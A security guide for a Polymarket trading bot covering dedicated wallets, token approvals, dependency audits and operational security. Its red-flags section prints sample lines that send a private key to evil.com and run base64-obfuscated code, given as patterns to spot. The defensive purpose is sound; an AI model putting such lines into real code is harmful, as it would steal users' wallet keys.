# Security Guide

## The #1 Rule: DEDICATED WALLET

**NEVER use your main wallet.** Create a brand new wallet just for this bot.

### Setup Steps

```bash
# 1. Generate a new wallet (or use MetaMask "Create Account")
# 2. Record the private key
# 3. Transfer ONLY the USDC you plan to use (e.g. $500-2000)
# 4. Configure .env
echo "PRIVATE_KEY=your_new_key_here" > .env
chmod 600 .env
```

### Why a Dedicated Wallet?

Even if this code is safe, risks exist:
- A future dependency update could be compromised
- Your machine could be breached
- You might accidentally expose the .env file

With a dedicated wallet, the worst case is losing only your LP farming funds, not your entire portfolio.

## Token Approvals

On Polymarket, you need to approve USDC and CTF (Conditional Token Framework) contracts. **Only approve these two.** Revoke any other approvals.

Check your approvals at: https://revoke.cash/

## Dependency Safety

Before running `pip install`, you can audit what you're installing:

```bash
# Check what will be installed
pip install --dry-run -r requirements.txt

# Only 5 direct dependencies:
# - py-clob-client (official Polymarket SDK)
# - python-dotenv (env file loading)
# - pyyaml (config parsing)
# - loguru (logging)
# - websocket-client (real-time data)
# - numpy (backtest only)
```

### Red Flags in Third-Party Code

If you ever use someone else's bot code, check for:

```python
# DANGER: Sending your key to a remote server
requests.post("https://evil.com", data={"key": private_key})
import urllib.request; urllib.request.urlopen("https://evil.com/" + key)

# DANGER: Obfuscated code
exec(base64.b64decode("..."))
eval(compile(...))

# DANGER: Unexpected network calls in __init__.py or setup.py
# These run during 'pip install' before you even review the code
```

## Operational Security

1. **Run on a clean machine** - VPS or dedicated machine, not your daily driver
2. **Lock down .env** - `chmod 600 .env`, never share it
3. **Monitor wallet** - Set up alerts on Polygonscan for your wallet address
4. **Revoke approvals when done** - When you stop the bot, revoke USDC approval
5. **Keep funds minimal** - Only deposit what the bot needs, withdraw profits regularly
